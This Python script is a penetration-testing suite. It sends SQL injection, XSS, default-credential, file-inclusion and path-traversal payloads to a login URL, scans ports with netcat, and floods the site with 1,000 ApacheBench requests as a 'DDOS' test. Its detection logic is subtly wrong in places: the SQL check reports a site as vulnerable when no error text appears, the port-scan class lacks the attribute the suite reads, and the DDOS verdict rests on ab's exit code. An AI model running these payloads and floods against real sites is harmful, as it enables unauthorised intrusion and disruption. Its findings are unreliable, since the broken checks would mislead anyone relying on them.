import requests
import json
import subprocess
import os
from typing import List

class PenetrationTest:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.headers = {
            'User-Agent': 'PenetrationTestingAgent/1.0',
            'Content-Type': 'application/json',
        }
    
    def run(self):
        raise NotImplementedError("Subclasses should implement this method.")
    
    def report(self, result: dict):
        print("Penetration Test Result:")
        print(json.dumps(result, indent=4))


class SQLInjectionTest(PenetrationTest):
    def __init__(self, target_url: str, payloads: List[str]):
        super().__init__(target_url)
        self.payloads = payloads

    def run(self):
        for payload in self.payloads:
            data = {'input': payload}
            response = requests.post(self.target_url, headers=self.headers, data=json.dumps(data))
            if 'error' not in response.text.lower():
                self.report({'url': self.target_url, 'payload': payload, 'status': 'Vulnerable to SQL Injection'})
            else:
                print(f"Test passed for payload {payload}")


class XSSVulnerabilityTest(PenetrationTest):
    def __init__(self, target_url: str, payloads: List[str]):
        super().__init__(target_url)
        self.payloads = payloads

    def run(self):
        for payload in self.payloads:
            data = {'input': payload}
            response = requests.post(self.target_url, headers=self.headers, data=json.dumps(data))
            if payload in response.text:
                self.report({'url': self.target_url, 'payload': payload, 'status': 'Vulnerable to XSS'})
            else:
                print(f"Test passed for payload {payload}")


class AuthBypassTest(PenetrationTest):
    def __init__(self, target_url: str, bypass_creds: dict):
        super().__init__(target_url)
        self.bypass_creds = bypass_creds

    def run(self):
        response = requests.post(self.target_url, headers=self.headers, data=json.dumps(self.bypass_creds))
        if response.status_code == 200:
            self.report({'url': self.target_url, 'status': 'Authentication Bypass Possible', 'response_code': response.status_code})
        else:
            print(f"Test passed with response code {response.status_code}")


class FileInclusionTest(PenetrationTest):
    def __init__(self, target_url: str, payloads: List[str]):
        super().__init__(target_url)
        self.payloads = payloads

    def run(self):
        for payload in self.payloads:
            url = f"{self.target_url}?file={payload}"
            response = requests.get(url, headers=self.headers)
            if response.status_code == 200 and "file not found" not in response.text.lower():
                self.report({'url': url, 'payload': payload, 'status': 'Vulnerable to File Inclusion'})
            else:
                print(f"Test passed for payload {payload}")


class DirectoryTraversalTest(PenetrationTest):
    def __init__(self, target_url: str, payloads: List[str]):
        super().__init__(target_url)
        self.payloads = payloads

    def run(self):
        for payload in self.payloads:
            url = f"{self.target_url}/{payload}"
            response = requests.get(url, headers=self.headers)
            if response.status_code == 200 and 'root:' in response.text.lower():
                self.report({'url': url, 'payload': payload, 'status': 'Vulnerable to Directory Traversal'})
            else:
                print(f"Test passed for payload {payload}")


class PortScanTest(PenetrationTest):
    def __init__(self, ip_address: str, port_range: List[int]):
        self.ip_address = ip_address
        self.port_range = port_range

    def run(self):
        for port in range(self.port_range[0], self.port_range[1] + 1):
            result = subprocess.run(['nc', '-zv', self.ip_address, str(port)], capture_output=True, text=True)
            if 'succeeded' in result.stderr:
                print(f"Port {port} is open on {self.ip_address}")
            else:
                print(f"Port {port} is closed on {self.ip_address}")


class DDOSProtectionTest(PenetrationTest):
    def __init__(self, target_url: str, attack_strength: int):
        super().__init__(target_url)
        self.attack_strength = attack_strength

    def run(self):
        command = f"ab -n {self.attack_strength} -c 10 {self.target_url}"
        result = os.system(command)
        if result != 0:
            self.report({'url': self.target_url, 'status': 'DDOS Attack Mitigated'})
        else:
            self.report({'url': self.target_url, 'status': 'DDOS Attack Possible'})


class TestSuite:
    def __init__(self):
        self.tests = []

    def add_test(self, test: PenetrationTest):
        self.tests.append(test)

    def run_all(self):
        for test in self.tests:
            print(f"Running {test.__class__.__name__} on {test.target_url}")
            test.run()


if __name__ == '__main__':
    # Define the target URLs and payloads for various penetration tests
    target = "https://website.com/login"
    
    sql_payloads = [
        "' OR 1=1 --", 
        "' OR 'a'='a'", 
        "admin' --"
    ]

    xss_payloads = [
        "<script>alert('XSS')</script>", 
        "<img src='invalid' onerror='alert(1)'/>"
    ]

    bypass_creds = {
        "username": "admin",
        "password": "password"
    }

    file_inclusion_payloads = [
        "../../passwd",
        "../../../../shadow"
    ]

    traversal_payloads = [
        "../", 
        "../../", 
        "../../../"
    ]

    test_suite = TestSuite()

    # Add different penetration tests to the suite
    test_suite.add_test(SQLInjectionTest(target, sql_payloads))
    test_suite.add_test(XSSVulnerabilityTest(target, xss_payloads))
    test_suite.add_test(AuthBypassTest(target, bypass_creds))
    test_suite.add_test(FileInclusionTest(target, file_inclusion_payloads))
    test_suite.add_test(DirectoryTraversalTest(target, traversal_payloads))
    test_suite.add_test(DDOSProtectionTest(target, attack_strength=1000))

    # Run all the tests in the suite
    test_suite.run_all()